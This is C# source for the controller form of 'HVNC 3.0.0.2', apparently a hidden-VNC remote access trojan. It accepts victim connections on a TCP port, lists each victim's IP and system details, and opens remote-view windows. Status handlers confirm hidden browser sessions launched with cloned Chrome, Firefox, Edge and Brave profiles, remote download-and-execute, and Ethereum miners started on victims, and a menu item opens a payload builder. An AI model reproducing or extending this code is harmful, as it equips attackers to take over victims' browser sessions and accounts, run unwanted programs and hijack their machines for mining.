using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace HVNC
{
    public partial class FrmMain : Form
    {
		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public FrmMain()
		{
			InitializeComponent();
		}


		private void Listenning()
		{
			checked
			{
				try
				{
					_clientList = new List<TcpClient>();
					_TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(HVNCListenPort.Text));
					_TcpListener.Start();
					_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
				}
				catch (Exception ex)
				{
					//MessageBox.Show(ex.Message);
					try
					{
						if (!ex.Message.Contains("aborted"))
						{
							IEnumerator enumerator = default(IEnumerator);
							while (true)
							{
								try
								{
									try
									{
										enumerator = Application.OpenForms.GetEnumerator();
										while (enumerator.MoveNext())
										{
											Form form = (Form)enumerator.Current;
											if (form.Name.Contains("FrmVNC"))
											{
												form.Dispose();
											}

										}
									}
									finally
									{
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
								}
								catch (Exception ex1)
								{
									//MessageBox.Show(ex1.Message);
									continue;
								}
								break;
							}

							bool_1 = false;
							HVNCListenBtn.Text = "Listen";
							int num = _clientList.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								_clientList[i].Close();
							}
							_clientList = new List<TcpClient>();
							int_2 = 0;
							_TcpListener.Stop();
							this.Text = "{ HVNC 3.0.0.2 } - Connections: 0";
						}
					}
					catch (Exception ex3)
					{
						//MessageBox.Show(ex3.Message);
					}
				}
			}
		}


		public static Random random = new Random();
		public static string RandomNumber(int length)
		{
			const string chars = "0123456789";
			return new string(Enumerable.Repeat(chars, length)
			  .Select(s => s[random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{

			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
			}
			catch (Exception ex)
			{
				//MessageBox.Show(ex.Message);
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{

			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;

					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;

					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}

					ulong num4 = BitConverter.ToUInt64(array, 0);
					int num5 = 0;
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];

					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num6 = 0;
						int num7 = array2.Length;

						while (num7 > 0)
						{
							num5 = tcpClient.GetStream().Read(array2, num6, num7);
							num7 -= num5;
							num6 += num5;
						}

						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;

						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));

						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									string ipp;

									try
                                    {
										//ipp = array3[7];
										ipp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();

									}
									catch
                                    {
										ipp = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}

									ListViewItem lvi = new ListViewItem(new string[]
									{
					" " + array3[1].Replace(" ", null) + RandomNumber(5), ipp, array3[2], array3[3], array3[4], array3[5], array3[6]
									})
									{ Tag = tcpClient, ImageKey = (array3[3].ToString() + ".png") };

									HVNCList.Invoke((MethodInvoker)delegate
                                    {
										lock (_clientList)
										{
											HVNCList.Items.Add(lvi);
											HVNCList.Items[int_2].Selected = true;
											_clientList.Add(tcpClient);
											int_2++;
											this.Text = "{ HVNC 3.0.0.2 } - Connections: " + Conversions.ToString(int_2);
										}
									});


								}

								else if (_clientList.Contains(tcpClient))
								{
									GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception ex)
							{
								//MessageBox.Show(ex.Message);
							}
						}
						else if (_clientList.Contains(tcpClient))
						{
							GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}

					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				}
				catch (Exception ex)
				{
					//MessageBox.Show(ex.Message);

					if (!ex.Message.Contains("disposed"))
					{
						try
						{
							if (_clientList.Contains(tcpClient))
							{
								int NumberReceived;
								int num8 = (NumberReceived = Application.OpenForms.Count - 2);
								while (NumberReceived >= 0)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											Invoke((MethodInvoker)delegate
											{

												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											});
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
									NumberReceived += -1;
								}
								lock (_clientList)
								{
									try
									{
										int index = _clientList.IndexOf(tcpClient);
										_clientList.RemoveAt(index);
										HVNCList.Items.RemoveAt(index);
										tcpClient.Close();
										int_2--;
										this.Text = "{ HVNC 3.0.0.2 } - Connections: " + Conversions.ToString(int_2);
									}
									catch (Exception ex1)
									{
										//MessageBox.Show(ex1.Message);
									}
								}
							}
						}
						catch (Exception ex2)
						{
							//MessageBox.Show(ex2.Message);
						}
					}
					else
					{
						tcpClient.Close();
					}
				}
			}
		}



		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{

			int hashCode = tcpClient_0.GetHashCode();
			FrmVNC vNCForm = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
			if (object_2 is Bitmap)
			{
				vNCForm.VNCBoxe.Image = (Image)object_2;
			}
			else
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] dataReceive = Conversions.ToString(object_2).Split('|');
				string left = dataReceive[0];


						if (Operators.CompareString(left, "0", TextCompare: false) == 0)
						{
							vNCForm.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
						}


						if (Operators.CompareString(left, "9", TextCompare: false) != 0)
						{
						Invoke((MethodInvoker)delegate
						{

							try
							{
								Clipboard.SetText(dataReceive[1]);
							}
							catch (Exception ex)
							{
								//MessageBox.Show(ex.Message);
							}
						});
						}


				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started with clone profile !";
				}

				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started !";
				}

				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started with clone profile !";
				}

				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started !";
				}

				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started with clone profile !";
				}

				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started !";
				}

				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started with clone profile !";
				}

				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}

				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
				}

				if (Operators.CompareString(left, "222", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETH miner successfully started !";
				}

				if (Operators.CompareString(left, "223", TextCompare: false) == 0)
				{
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETC miner successfully started !";
				}

				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
						{
							vNCForm.FrmTransfer0.int_0 = Conversions.ToInteger(dataReceive[1]);
							vNCForm.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(dataReceive[1]);
						}


						if (Operators.CompareString(left, "23", TextCompare: false) == 0)
						{
							vNCForm.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(dataReceive[1]));
						}


						if (Operators.CompareString(left, "24", TextCompare: false) == 0)
						{
							vNCForm.FrmTransfer0.FileTransferLabele.Text = "Clone successfully !";
						}


						if (Operators.CompareString(left, "25", TextCompare: false) == 0)
						{
							vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
						}

						if (Operators.CompareString(left, "26", TextCompare: false) == 0)
						{
							vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
						}
			}
		}

        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
			if (HVNCList.FocusedItem.Index == -1)
			{
				return;
			}
			checked
			{
				int num = Application.OpenForms.Count - 1;
				while (true)
				{
					if (num >= 0)
					{
						if (Application.OpenForms[num].Tag == _clientList[HVNCList.FocusedItem.Index])
						{
							break;
						}
						num += -1;
						continue;
					}

					FrmVNC vNCForm = new FrmVNC();
					vNCForm.Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode());
					vNCForm.Tag = _clientList[HVNCList.FocusedItem.Index];
					string name = HVNCList.FocusedItem.SubItems[2].ToString();
					name = name.Replace("ListViewSubItem", "{ HVNC 3.0.0.2 } - Connected to:");
					vNCForm.Text = name;
					vNCForm.Show();
					return;
				}
				Application.OpenForms[num].Show();
			}
		}

			private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
			e.DrawDefault = true;
		}

        private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

        private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
			}
			else
			{
				e.DrawDefault = true;
			}
		}


        private void HVNCListenBtn_Click_1(object sender, EventArgs e)
        {
			if (Operators.CompareString(HVNCListenBtn.Text, "Listen", TextCompare: false) == 0) // Check if listen or not
			{
				HVNCListenBtn.Text = "Stop";

				buildHVNCToolStripMenuItem.Enabled = true;

				HVNCListenBtn.Image = imageList2.Images[0];

				HVNCListenPort.Enabled = false;

				VNC_Thread = new Thread(Listenning) // Listenning
				{
					IsBackground = true
				};

				bool_1 = true;

				VNC_Thread.Start();

				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			while (true)
			{
				try
				{
					try
					{
						enumerator = Application.OpenForms.GetEnumerator();
						while (enumerator.MoveNext())
						{
							Form form = (Form)enumerator.Current;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}

						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					//MessageBox.Show(ex.Message);
					continue;
				}
				break;
			}

			HVNCListenPort.Enabled = true;
			VNC_Thread.Abort();
			bool_1 = false;
			HVNCListenBtn.Text = "Listen";
			HVNCListenBtn.Image = imageList2.Images[1];
			buildHVNCToolStripMenuItem.Enabled = false;
			HVNCList.Items.Clear();
			_TcpListener.Stop();
			checked
			{
				int num = _clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					_clientList[i].Close();
				}
				_clientList = new List<TcpClient>();
				int_2 = 0;
				this.Text = "{ HVNC 3.0.0.2 } - Connections: 0";
			}
		}

        private void buildHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
			FrmBuilder frm2 = new FrmBuilder(HVNCListenPort.Text);
			frm2.ShowDialog();
		}

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
			SaveSettings();
			Environment.Exit(0);
		}


		private void FrmMain_Load(object sender, EventArgs e)
        {
			this.Text = "{ HVNC 3.0.0.2 } - Connections: 0";
			
			ReadSettings();
        }

		public bool SaveSettings()
		{
			try
			{
				string filePath = (Path.GetDirectoryName(Application.ExecutablePath) + "\\HVNC 3.0.0.2.conf");
				List<string> lines = File.ReadLines(filePath).ToList();
				lines[3] = "[listenning=" + listenning1.Text.ToLower() + "]" ;
				lines[4] = ("port=" + HVNCListenPort.Text);
				File.WriteAllLines(filePath, lines);

				return true;
			}
			catch
			{
				return false;
			}

		}


		public bool ReadSettings()
        {
			try
			{
				string filePath = (Path.GetDirectoryName(Application.ExecutablePath) + "\\HVNC 3.0.0.2.conf");
			List<string> lines = File.ReadLines(filePath).ToList();

				string p = lines[4].Replace("port=", null);
				HVNCListenPort.Text = p;

			if (lines[3].ToString().Contains("enabled"))
			{
				listenning1.SelectedIndex = 1;
				listenning1.Text = "Enabled";
					HVNCListenBtn.PerformClick();
			}
			else
                {
					listenning1.Text = "Disabled";
				}


				return true;
		}
			catch
			{
				return false;
			}
		}

		private void listenning1_TextChanged(object sender, EventArgs e)
        {
			SaveSettings();

		}

        private void HVNCListenPort_TextChanged(object sender, EventArgs e)
        {
			SaveSettings();

		}
    }


}
